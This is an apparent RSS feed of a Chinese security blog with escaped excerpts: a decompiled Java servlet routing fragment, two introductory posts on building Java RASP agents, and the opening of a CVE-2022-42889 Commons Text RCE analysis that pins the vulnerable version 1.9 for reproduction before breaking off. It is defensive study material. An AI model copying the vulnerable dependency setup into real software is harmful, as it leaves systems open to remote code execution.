style=&#34;color:#ff6ac1&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#57c7ff&#34;&gt;getParamValue&lt;/span&gt;(request, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;user_code&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; (userCode &lt;span style=&#34;color:#ff6ac1&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;null&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            InvocationInfoProxy.&lt;span style=&#34;color:#57c7ff&#34;&gt;getInstance&lt;/span&gt;().&lt;span style=&#34;color:#57c7ff&#34;&gt;setUserCode&lt;/span&gt;(userCode);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; (token &lt;span style=&#34;color:#ff6ac1&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;null&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            NetStreamContext.&lt;span style=&#34;color:#57c7ff&#34;&gt;setToken&lt;/span&gt;(KeyUtil.&lt;span style=&#34;color:#57c7ff&#34;&gt;decodeToken&lt;/span&gt;(token));&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        String pathInfo &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; request.&lt;span style=&#34;color:#57c7ff&#34;&gt;getPathInfo&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        log.&lt;span style=&#34;color:#57c7ff&#34;&gt;debug&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Before Invoke: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; pathInfo);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#9aedfe&#34;&gt;long&lt;/span&gt; requestTime &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; System.&lt;span style=&#34;color:#57c7ff&#34;&gt;currentTimeMillis&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; (pathInfo &lt;span style=&#34;color:#ff6ac1&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;null&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff6ac1&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;new&lt;/span&gt; ServletException(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Service name is not specified, pathInfo is null&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            pathInfo &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; pathInfo.&lt;span style=&#34;color:#57c7ff&#34;&gt;trim&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            String moduleName &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;null&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            String serviceName &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;null&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#9aedfe&#34;&gt;int&lt;/span&gt; beginIndex;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; (pathInfo.&lt;span style=&#34;color:#57c7ff&#34;&gt;startsWith&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;/~&amp;#34;&lt;/span&gt;)) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                moduleName &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; pathInfo.&lt;span style=&#34;color:#57c7ff&#34;&gt;substring&lt;/span&gt;(2);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                beginIndex &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; moduleName.&lt;span style=&#34;color:#57c7ff&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; (beginIndex &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;gt;=&lt;/span&gt; 0) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    serviceName &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; moduleName.&lt;span style=&#34;color:#57c7ff&#34;&gt;substring&lt;/span&gt;(beginIndex);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; (beginIndex &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;gt;&lt;/span&gt; 0) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        moduleName &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; moduleName.&lt;span style=&#34;color:#57c7ff&#34;&gt;substring&lt;/span&gt;(0, beginIndex);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    } &lt;span style=&#34;color:#ff6ac1&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        moduleName &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;null&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                } &lt;span style=&#34;color:#ff6ac1&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    moduleName &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;null&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    serviceName &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; pathInfo;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#ff6ac1&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                serviceName &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; pathInfo;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; (serviceName &lt;span style=&#34;color:#ff6ac1&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;null&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff6ac1&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;new&lt;/span&gt; ServletException(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Service name is not specified&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            beginIndex &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; serviceName.&lt;span style=&#34;color:#57c7ff&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; (beginIndex &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;&lt;/span&gt; 0 &lt;span style=&#34;color:#ff6ac1&#34;&gt;||&lt;/span&gt; beginIndex &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;gt;=&lt;/span&gt; serviceName.&lt;span style=&#34;color:#57c7ff&#34;&gt;length&lt;/span&gt;() &lt;span style=&#34;color:#ff6ac1&#34;&gt;-&lt;/span&gt; 1) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff6ac1&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;new&lt;/span&gt; ServletException(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Service name is not specified&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            serviceName &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; serviceName.&lt;span style=&#34;color:#57c7ff&#34;&gt;substring&lt;/span&gt;(beginIndex &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; 1);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Object obj &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;null&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            String method;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff6ac1&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                obj &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#57c7ff&#34;&gt;getServiceObject&lt;/span&gt;(moduleName, serviceName);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#ff6ac1&#34;&gt;catch&lt;/span&gt; (ComponentException var76) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                method &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; svcNotFoundMsgFormat.&lt;span style=&#34;color:#57c7ff&#34;&gt;format&lt;/span&gt;(&lt;span style=&#34;color:#ff6ac1&#34;&gt;new&lt;/span&gt; Object&lt;span style=&#34;color:#ff6ac1&#34;&gt;[]&lt;/span&gt;{serviceName});&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                Logger.&lt;span style=&#34;color:#57c7ff&#34;&gt;error&lt;/span&gt;(method, var76);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff6ac1&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;new&lt;/span&gt; ServletException(method);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pr</description>
    </item>
    <item>
      <title>RASP技术学习入门篇(1)</title>
      <link>https://www.snakin.top/posts/rasp1/</link>
      <pubDate>Tue, 21 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://www.snakin.top/posts/rasp1/</guid>
      <description>&lt;h1 id=&#34;java-rasp技术&#34;&gt;Java RASP技术&lt;/h1&gt;&#xA;&lt;p&gt;运行时应用程序自我保护（&lt;code&gt;Runtime application self-protection&lt;/code&gt;，简称&lt;code&gt;RASP&lt;/code&gt;）使用Java Agent技术在应用程序运行时候动态编辑类字节码，将自身防御逻辑注入到Java底层API和Web应用程序当中，从而与应用程序融为一体，能实时分析和检测Web攻击，使应用程序具备自我保护能力。&lt;/p&gt;&#xA;&lt;p&gt;RASP技术作为新兴的WEB防御方案，不但能够有效的防御传统WAF无法实现的攻击类型，更能够大幅提升对攻击者攻击行为的检测精准度。RASP是传统WAF的坚实后盾，能够弥补WAF无法获取Web应用&lt;code&gt;运行时&lt;/code&gt;环境的缺陷，同时也是传统Web应用服务最重要的不可或缺的一道安全防线。&lt;/p&gt;&#xA;&lt;p&gt;RASP通过注入自身到开发语言底层API中，从而完全的融入于Web服务中，拥有了得天独厚的漏洞检测和防御条件，RASP技术相较于传统的WAF拥有了更加精准、深层次的防御。RASP采用&lt;code&gt;基于攻击行为分析&lt;/code&gt;的&lt;code&gt;主动防御&lt;/code&gt;机制，严防&lt;code&gt;文件读写&lt;/code&gt;、&lt;code&gt;数据访问&lt;/code&gt;、&lt;code&gt;命令执行&lt;/code&gt;等Web应用系统命脉，为Web应用安全筑建出“万丈高墙”。&lt;/p&gt;&#xA;&lt;h2 id=&#34;rasp技术原理&#34;&gt;RASP技术原理&lt;/h2&gt;&#xA;&lt;p&gt;&lt;code&gt;JDK1.5&lt;/code&gt;开始，&lt;code&gt;Java&lt;/code&gt;新增了&lt;code&gt;Instrumentation（Java Agent API）&lt;/code&gt;和&lt;code&gt;JVMTI（JVM Tool Interface）&lt;/code&gt;功能，允许&lt;code&gt;JVM&lt;/code&gt;在加载某个&lt;code&gt;class文件&lt;/code&gt;之前对其字节码进行修改，同时也支持对已加载的&lt;code&gt;class（类字节码）&lt;/code&gt;进行重新加载（&lt;code&gt;Retransform&lt;/code&gt;）。&lt;/p&gt;&#xA;&lt;p&gt;利用&lt;code&gt;Java Agent&lt;/code&gt;这一特性衍生出了&lt;code&gt;APM（Application Performance Management，应用性能管理）&lt;/code&gt;、&lt;code&gt;RASP（Runtime application self-protection，运行时应用自我保护）&lt;/code&gt;、&lt;code&gt;IAST（Interactive Application Security Testing，交互式应用程序安全测试）&lt;/code&gt;等相关产品，它们都无一例外的使用了&lt;code&gt;Instrumentation/JVMTI&lt;/code&gt;的&lt;code&gt;API&lt;/code&gt;来实现动态修改&lt;code&gt;Java类字节码&lt;/code&gt;并插入监控或检测代码。&lt;/p&gt;&#xA;&lt;p&gt;RASP防御的核心就是在Web应用程序执行关键的Java API之前插入防御逻辑，从而控制原类方法执行的业务逻辑。如果没有RASP的防御，攻击者可以利用Web容器/应用的漏洞攻击应用服务器。&lt;/p&gt;&#xA;&lt;h2 id=&#34;项目地址&#34;&gt;项目地址&lt;/h2&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/iiiusky/java_rasp_example&#34;&gt;https://github.com/iiiusky/java_rasp_example&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;实现一个简易的rasp&#34;&gt;实现一个简易的RASP&lt;/h2&gt;&#xA;&lt;h3 id=&#34;创建入口类&#34;&gt;创建入口类&lt;/h3&gt;&#xA;&lt;p&gt;在&lt;code&gt;cn.org.javaweb.agent&lt;/code&gt;包下新建一个类。&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;package&lt;/span&gt; cn.org.javaweb.agent;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; java.lang.instrument.Instrumentation;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#f3f99d&#34;&gt;Agent&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#9aedfe&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;premain&lt;/span&gt;(String agentArgs, Instrumentation inst) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        inst.&lt;span style=&#34;color:#57c7ff&#34;&gt;addTransformer&lt;/span&gt;(&lt;span style=&#34;color:#ff6ac1&#34;&gt;new&lt;/span&gt; AgentTransform());&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pr</description>
    </item>
    <item>
      <title>RASP技术学习入门篇(2)</title>
      <link>https://www.snakin.top/posts/rasp2/</link>
      <pubDate>Tue, 21 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://www.snakin.top/posts/rasp2/</guid>
      <description>&lt;h2 id=&#34;项目地址&#34;&gt;项目地址&lt;/h2&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/xbeark/javaopenrasp&#34;&gt;https://github.com/xbeark/javaopenrasp&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;&#xA;&lt;p&gt;该rasp相比于上一篇文章的项目复杂许多，这次希望能够更深入了解rasp的实现思路&lt;/p&gt;&#xA;&lt;p&gt;该项目实现的保护点：&lt;/p&gt;&#xA;&lt;p&gt;RCE&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;反序列化漏洞&lt;/li&gt;&#xA;&lt;li&gt;Ognl表达式执行&lt;/li&gt;&#xA;&lt;li&gt;ProcessBuilder log&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;SQL注入&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;MySql注入保护&lt;/li&gt;&#xA;&lt;li&gt;SQLServer注入保护&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 id=&#34;代码浅析&#34;&gt;代码浅析&lt;/h2&gt;&#xA;&lt;p&gt;首先看到入口&lt;code&gt;xbear/javaopenrasp/Agent.java&lt;/code&gt;，该类实现了premain函数也就是运行前加载的方式&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#f3f99d&#34;&gt;Agent&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#9aedfe&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;premain&lt;/span&gt;(String agentArgs, Instrumentation inst)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff5c57&#34;&gt;throws&lt;/span&gt; ClassNotFoundException, UnmodifiableClassException {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Console.&lt;span style=&#34;color:#57c7ff&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;init&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        init();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        inst.&lt;span style=&#34;color:#57c7ff&#34;&gt;addTransformer&lt;/span&gt;(&lt;span style=&#34;color:#ff6ac1&#34;&gt;new&lt;/span&gt; ClassTransformer());&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#9aedfe&#34;&gt;boolean&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;init&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Config.&lt;span style=&#34;color:#57c7ff&#34;&gt;initConfig&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;true&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pr</description>
    </item>
    <item>
      <title>漏洞分析 | Apache Commons Text RCE(CVE-2022-42889)分析</title>
      <link>https://www.snakin.top/posts/apache-commons-text-rcecve-2022-42889/</link>
      <pubDate>Sun, 29 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://www.snakin.top/posts/apache-commons-text-rcecve-2022-42889/</guid>
      <description>&lt;h2 id=&#34;漏洞信息&#34;&gt;漏洞信息&lt;/h2&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om&#34;&gt;https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h2&gt;&#xA;&lt;p&gt;添加依赖&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#78787e&#34;&gt;&amp;lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-text --&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.commons&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;commons-text&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.9&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span 